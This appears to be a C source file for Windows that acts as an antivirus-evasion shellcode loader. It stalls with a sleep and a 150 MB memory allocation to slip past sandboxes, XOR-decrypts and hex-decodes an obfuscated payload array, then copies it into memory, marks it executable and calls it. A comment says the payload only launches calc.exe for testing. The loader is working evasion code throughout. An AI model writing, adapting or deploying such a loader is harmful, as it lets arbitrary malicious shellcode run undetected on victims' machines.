#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>
#include "shellcodefuncs.h"

#define memBomb 150000000
#define MAGIC_BYTE_A 0xf1

int main() {

    Sleep(7500);
    BYTE *junk_mem = (BYTE *)malloc(memBomb);

    if (junk_mem){

        // runs calc.exe (i686) testing purpose. 

        unsigned char encrypted_txt[] = {'|','I','a','G','S','K','\x5C','V','z','U','H','o','I','f','S','A','B','P','B','i','U','L','}','[','c','Q','[','P','U','@','s','G','I','y','A','q','U','W','J','G','D','\x7F',']','[','}','M','k','G','S','G','Q','V','{','Q','A','o','I','f','S','A','B','P','C','i','T','I','|','[','c','P','P','P','U','A','z','G','I','y','@','q','U','Z','K','G','D','\x7F',']','[','}','L','g','G','S','G','W','V','{','P','O','o','I','j',']','A','B','P','G','i','U','M','u','[','c','P','R','P','U','@','s','G','I','x','O','q','U','Z','J','G','D','\x7E','V','[','}','L','c','G','S','F',']','V','{','\x5C','@','o','I','f','S','A','B','\x5C','L','i','U','L','\x7E','[','c','P','S','P','U','@','r','G','I','x','K','q','U','V','D','G','D','r',']','[','}','L','f','G','S','G','U','V','{','P','I','o','I','f','S','A','B','Q','L','i','T','I','\x7F','[','c','\x5C','[','P','U','A','\x7E','G','I','x','K','q','U','Z','E','G','D','\x7E','U','[','}','L','g','G','S','G','T','V','{','Q','@','o','H','c','W','A','C','U','F','i','U','@','z','[','c','\x5C','Z','P','U','A','z','G','I','t','@','q','U','V','F','G','D','\x7F','\x5C','[','}','L','f','G','S','K','\x5C','V','{','Q','A','o','I','f','U','A','B','P','D','i','U','@','t','[','c','P','S','P','U','@','s','G','I','t','@','q','U','W','K','G','D','r','\x5C','[','|','I','a','G','S','F',']','V','z','U','I','o','I','g',']','A','B','Q','M','i','U','@','t','[','c','P','V','P','T','D','z','G','I','x','I','q','T','S','@','G','D','\x7E','U','[','}','L','\x60','G','S','G','U','V','{','P','J','o','I','f','P','A','B','P','B','i','U','@','u','[','c','P','P','P','U','A','{','G','I','y','@','q','U','W','J','G','D','\x7E','S','[','}','@','k','G','S','G','W','V','{','\x5C','N','o','I','f','T','A','B','\x5C','M','i','U','L','{','[','c','\x5C','[','P','U','A','y','G','I','t','@','q','U','W','K','G','D','\x7F','\x5C','[','}','L','f','G','S','G','S','V','z','U','H','o','I','f','T','A','B','P','F','i','U','L','{','[','c','Q','[','P','U','@','r','G','H','}','I','q','U','W','K','G','D','\x7E','V','[','}','M','j','G','S','G','S','V','{','\x5C','A','o','I','f','V','A','B','P','C','i','U','L','}','[','c','Q','[','P','U','@','s','G','I','y','@','q','T','S','B','G','D','\x7E','T','[','}','L','e','G','S','K',']','V','{','P','K','o','I','f','R','A','B','Q','M','i','U','L','{','[','b','U','R','P','U','A','z','G','I','x','H','q','U','Z','E','G','D','\x7E','W','[','}','L','d','G','S','G','S','V','{','\x5C','A','o','I','f','T','A','B','P','F','i','U','L','{','[','c','\x5C','[','P','U','@','s','G','I','y','@','q','T','S','B','G','D','\x7E','Q','[','}','L','b','G','S','F','\x5C','V','z','U','K','o','H','c','W','A','B','\x5C','C','i','U','@','t','[','c','\x5C','Z','P','U','@','r','G','I','t','@','q','T','S','@','G','D','\x7F',']','[','|','I','c','G','S','F',']','V','{','Q','@','o','I','j','\x5C','A','B','P','A','i','U','L','|','[','c','P','U','P','T','D','z','G','I','y','A','q','U','V','G','G','D','\x7E','V','[','|','I','a','G','S','G','Q','V','{','Q','A','o','I','f','T','A','B','P','A','i','T','I','}','[','b','U','Q','P','U','A','}','G','I','x','H','q','U','Z','J','G','D','\x7E','P','[','|','I','c','G','S','G','U','V','{','P','K','o','I','f','P','A','B','P','G','i','T','I','|','[','c','P','Q','P','U','A','x','G','I','x','O','q','U','V','D','G','D','r',']','[','}','L','\x60','G','S','G','S','V','{','P','I','o','I','f','W','A','B','Q','L','i','U','M','t','[','b','U','S','P','U','A','z','G','I','x','M','q','U','V','F','G','D','\x7E','S','[','}','@','k','G','S','F',']','V','{','\x5C','@','o','I','f','W','A','B','\x5C','L','i','U','L','{','[','c','\x5C','[','P','U','A','x','G','I','x','O','q','U','W','K','G','D','r','\x5C','[','}','M','k','G','S','F','\x5C','V','z','U','I','o','I','f','T','A','B','P','B','i','U','@','u','[','c','Q','[','P','U','A','y','G','I','x','O','q','U','Z','J','G','D','\x7F',']','[','}','M','j','G','R','B','U','V','{','Q','A','o','I','f','S','A','B','P','C','i','U','L','\x7F','[','c','P','Q','P','U','A','{','G','I','x','K','q','U','V','B','G','D','\x7E','W','[','}','L','\x60','G','S','K',']','V','{','P','J','o','I','j',']','A','B','P','@','i','U','M','t','[','c','P','P','P','U','A','|','G','I','x','J','q','U','Z','E','G','D','\x7E','V','[','}','M','j','G','R','B','W','V','z','U','K','o','H','c','T','A','B','Q','L','i','U','L','\x7E','[','b','U','Q','P','U','A','x','G','H','}','K','q','U','V','A','G','D','r','R','[','}','L','e','G','S','K',']','V','{','Q','@','o','I','f','U','A','C','U','E','i','U','@','u','[','c','P','U','P','T','D','{','G','I','x','J','q','T','S','B','G','D','\x7E','Q','[','}','@','d','G','S','F',']','V','{','Q','@','o','I','f','S','A','C','U','D','i','U','L','{','[','c','P','P','P','U','M','s','G','I','x','I','q','U','W','J','G','D','\x7F',']','[','}','M','k','G','S','F',']','V','{','Q','A','o','I','g',']','A','B','P','G','i','U','M','u','[','c','P','W','P','U','A','}','G','I','x','H','q','U','W','K','G','D','\x7E','S','[','}','@','k','G','S','G','Q','V','z','U','K','o','I','f','S','A','B','P','A','i','T','I','\x7F','[','b','U','Q','P','T','D','{','G','I','x','J','q','U','Z','J','G','D','r',']','[','|','I','a','G','S','F',']','V','{','\x5C','A','o','I','f','V','A','B','\x5C','C','i','U','L',
        '}','[','c','P','P','P','U','A','\x7F','G','I','x','M','q','U','V','D','G','D','r','R','[','}','L','g','G','S','G','R','V','{','P','J','o','I','j',']','A','C','U','D','i','U','L','z','[','b','U','S','P','T','D','y','G','H','}','K','q','T','S','B','G','D','\x7E','V','[','}','L','b','G','S','K','\x5C','V','{','Q','A','o','I','f','Q','A','B','P','A','i','U','@','t','[','c','Q','[','P','U','M','|','G','I','x','O','q','U','W','J','G','E','{','W','[','}','@','k','G','R','B','T','V','{','Q','A','o','I','f','P','A','B','P','G','i','U','M','u','[','c','P','P','P','U','M','s','G','I','t','A','q','U','V','@','G','D','\x7E','P','[','}','M','j','G','S','G','T','V','{','P','L','o','I','f','U','A','B','P','@','i','T','I','\x7F','[','c','P','W','P','U','M','|','G','I','y','A','q','U','W','J','G','D','\x7E','V','[','}','L','b','G','R','B','W','V','z','U','K','o','H','c','U','A','B','P','G','i','U','L','y','[','c','P','R','P','U','A','\x7F','G','I','y','@','q','U','V','F','G','D','r','\x5C','[','}','L','g','G','S','G','T','V','{','P','I','o','H','c','T','A','B','P','@','i','U','L','\x7E','[','c','P','V','P','U','A','}','G','I','x','M','q','U','V','A','G','D','\x7F',']','[','}','M','k','G'};

        char xor_key[] = "MySecretKey";
        unsigned int char_in_hex;

        memset(junk_mem, MAGIC_BYTE_A, memBomb);
        free(junk_mem);
        
        xor_decrypt(encrypted_txt, xor_key);
        
        unsigned char *shellcode = ascii_decode((const char *)encrypted_txt);
        unsigned int shellcode_size = strlen((const char*)shellcode);
        unsigned int memory_allocation = shellcode_size / 2;
   
        for(unsigned int i = 0; i< shellcode_size-1; i++) {
    
            sscanf((const char *)shellcode+2*i, "%2X", &char_in_hex);
            shellcode[i] = (char)char_in_hex;
    
        }

        void *exec = VirtualAlloc(0, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        memcpy(exec, shellcode, memory_allocation);
        free(shellcode);

        DWORD ignore;
        VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);
        (*(void (*)()) exec)();
    
    }
    
    return 0;

}